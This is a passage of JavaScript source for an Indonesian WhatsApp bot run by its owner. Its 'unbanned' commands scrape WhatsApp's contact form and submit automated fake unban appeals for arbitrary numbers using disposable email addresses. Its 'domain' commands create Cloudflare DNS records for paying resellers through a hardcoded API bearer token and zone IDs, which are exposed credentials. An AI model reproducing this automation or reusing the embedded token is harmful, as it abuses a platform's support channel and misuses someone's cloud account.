form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ZassTdr.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv2": {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ZassTdr.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv3": {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ZassTdr.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv4": {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ZassTdr.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv5": {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
ZassTdr.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "addprem":{
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./ZassTdrjs/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./ZassTdrjs/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
case 'public': {
if (!isCreator) return m.reply(mess.OnlyCreator)
ZassTdr.public = true
m.reply('MODE MALAM PERTAMA AKTIF')
}
break
case 'self': {
if (!isCreator) return m.reply(mess.OnlyCreator)
ZassTdr.public = false
m.reply('MODE BISU+BUDEG AKTIF')
}
break
case 'restseler':{
if (!isCreator) return m.reply(`sorry anda sepertinya bukan pemilik bot`)
owner.splice('[]')
fs.writeFileSync('./ZassTdrjs/database/seller.json', JSON.stringify(owner))
m.reply(`SUKSES✅`)
}
break
case 'listseler':{
if (!isCreator) return m.reply(`mau tanya mek lu itu Naufal bukan?`)
let listusr =`*List user Reseler Panel ${global.ownerName}*\n\ntotal user : ${owner.length}\n`
var no = 1
for (let x of owner) {
listusr +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listusr +=`Untuk menghapus user/member\nKetik ${prefix}delusr 628xxx/@tag`
m.reply(listusr)
}
break
case "addseler":{
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ZassTdr.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
seler.push(prrkek)
fs.writeFileSync("./ZassTdrjs/database/seler.json", JSON.stringify(seler))
reply(`Nomor ${prrkek} Telah Menjadi Seller!`)
}
break
case "delseler":{
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = seler.indexOf(ya)
seler.splice(unp, 1)
fs.writeFileSync("./ZassTdrjs/database/seler.json", JSON.stringify(seler))
reply(`Nomor ${ya} Telah Di Hapus Seller!`)
}
case 'domainmenu':
case 'domain':
case 'subdomain':{
let domain = (`▭▬▭( *DOMAIN MENU* )▭▬▭

┏━ ◦ ${prefix}domain1 jasa-panel.my.id 
┣❏ ◦ ${prefix}domain2 didinsec.biz.id 
┣❏ ◦ ${prefix}domain3 putraoffc.cfd 
┣❏ ◦ ${prefix}domain4 sellerpannel.my.id 
┣❏ ◦ ${prefix}domain5 pannelku.icu
┣❏ ◦ ${prefix}domain6 pannelku.cfd
┣❏ ◦ ${prefix}domain7 putraoffc.site
┣❏ ◦ ${prefix}domain8 putraoffc.com 
┣❏ ◦ ${prefix}domain9 kangpannel.xyz 
┣❏ ◦ ${prefix}domain10 mypannelku.com 
┣❏ ◦ ${prefix}domain11 pannelmurah.xyz
┣❏ ◦ ${prefix}domain12 storepannel.xyz
┣❏ ◦ ${prefix}domain13 tokopannel.xyz
┣❏ ◦ ${prefix}domain14 mypannel.cfd
┣❏ ◦ ${prefix}domain15 adminpannel.xyz
┣❏ ◦ ${prefix}domain16 mypannel.icu
┣❏ ◦ ${prefix}domain17 tokocpannelmurah.xyz
┗━ ◦ ${prefix}domain18 websitepannelmurah.com

*NOTE :*
_*DOMAIN INI YANG BERSANGKUTAN DENGAN WHM / CPANEL OTOMATIS DI KICK + NOREFFUND !*_

*JOIN RESELLER SUBDOMAIN*?
_CHAT NAUFAL OFFC⚡_
wa.me/6283846416175`)
ZassTdr.sendMessage(m.chat, {
text: domain,
contextInfo: {
externalAdReply: {
title: namaownernya,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/832778d1023ed5ff024f8.jpg',
sourceUrl: "https://chat.whatsapp.com/C5t7coy3AkC67g2qYjdko8",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}

break

 case 'domain1': {
 
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "ab732313828957ac4dfa9dd05ecdbea4";
    let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
    let tld = "jasa-panel.my.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By NaufalOffc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain2': {
           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b263ae8b1bb47329a24aa3898de4f0b4";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "didinsec.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain3 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain3': {
           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a8fda718f07621d32f906f1cc9938358";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain4': {
           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d41a17e101c0f89f0aec609c31137f91";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "sellerpannel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain5': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d877d9cf996ac8a1b371851e733ba20e";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelku.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain6': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f58970b468ab2eb4c3a546c0e37680e0";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelku.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           case 'domain7': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "92fffa5f2cce4005a30e3950620cb97d";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
        
        break
           case 'domain8': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e03420325af30aaed049cbcc4c3381ed";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain9': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba86d80050aa5a2343a8e456c85c32f0";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "kangpannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Naufal Offc⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain10': {
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283846416175")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "deb75eb2d37b30e954684a3db7f1e323";
